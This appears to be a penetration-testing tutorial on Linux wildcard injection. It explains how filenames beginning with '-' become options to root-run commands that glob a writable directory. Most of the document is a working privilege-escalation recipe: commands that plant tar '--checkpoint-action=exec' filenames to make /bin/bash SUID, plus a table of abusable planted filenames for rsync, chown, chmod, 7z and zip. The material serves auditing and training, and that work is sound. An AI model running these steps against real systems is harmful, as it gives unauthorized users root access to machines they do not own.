# Wildcard Injection

The shell expands `*` into a list of filenames **before** the command runs. If a filename starts with `-`, the command receives it as an option, not as data. So write access to the directory a privileged script globs over is write access to that command's argument list.

```text
Privileged script:   tar -czf backup.tar.gz *
You control:         filenames in that directory
Therefore:           you control tar's argument list
```

Both halves are required and neither is a finding alone. A wildcard over `/root/` you cannot write to is inert. A writable directory in a command with explicit filenames is inert too.

## Find the wildcard in a privileged command

```bash
grep -rnE '(tar|rsync|chown|chmod|zip|7z|scp)[^|;#]*\*' \
  /etc/cron.d /etc/cron.daily /opt /usr/local/bin /srv 2>/dev/null
```

- `-r` → recurse, because the script is rarely where you first looked. Cron entries point at `/usr/local/bin` and `/opt` far more often than they hold the command themselves.
- `-n` → line numbers, so you can go straight back to the line rather than re-reading the file.
- `[^|;#]*` → keeps the match on the *same command* as the binary name and drops comment lines. Without it, a `#` line documenting the backup and a second command after a `;` both match, and the false positives outnumber the real hits.
- listing the directories explicitly rather than searching `/` → a full-filesystem grep on a live host is slow, loud, and returns every manual page that mentions `tar`.

## The classic case — `tar`

```bash
cd /opt/backups
```

```bash
printf '#!/bin/sh\nchmod +s /bin/bash\n' > .s.sh
```

```bash
chmod +x .s.sh
```

```bash
touch -- '--checkpoint=1'
```

```bash
touch -- '--checkpoint-action=exec=sh .s.sh'
```

- `touch --` → **the flag the whole technique dies without.** The `--` tells `touch` itself that everything after it is a filename, not an option. Leave it out and `touch` reads `--checkpoint=1` as its own argument, fails with an unrecognised-option error, and you are left with no file at all — or, worse on some shells, an ordinary file with a mangled name and a job that runs perfectly cleanly with no effect.
- `--checkpoint=1` → tells tar to fire a checkpoint after the first record, so the action runs immediately rather than on a large archive.
- `--checkpoint-action=exec=sh .s.sh` → the payload. The path is resolved relative to tar's working directory, which is the directory being archived, so a bare filename is correct here and an absolute path also works.
- `chmod +s /bin/bash` rather than a reverse shell → the job runs with no terminal and probably no egress. A SUID shell needs neither, and `bash -p` afterwards keeps the euid.
- the leading dot on `.s.sh` → keeps the payload out of the glob itself. `*` does not match dotfiles, so tar will not try to archive your script and complain about it.

## Other commands with the same shape

The pattern generalises to any command with an option that executes something, reads something, or references another file. Filenames that begin with `-` are how you reach it.

| Binary | Filename to plant | What it does |
|---|---|---|
| `rsync` | `-e sh shell.sh` | `-e` names the remote shell command, and it is executed |
| `chown` | `--reference=ref` | copies ownership from a file you own onto every globbed file |
| `chmod` | `--reference=ref` | the same, for the mode bits |
| `7z` | `-i@file` , `@file` | reads a file list; the error output leaks the contents of files you cannot read |
| `zip` | `-T` and `--unzip-command=` | `-T` tests the archive by running the named command |

`chown --reference` is the quiet one worth remembering: it does not execute anything, so it looks harmless, but pointing a root-run `chown -R` at a reference file **you** own transfers ownership of everything in that glob to you — and if the glob covers a directory holding a script that root later executes, that is the same escalation reached one step sideways.

GTFOBins lists which options are abusable per binary; the wildcard is only the delivery mechanism.
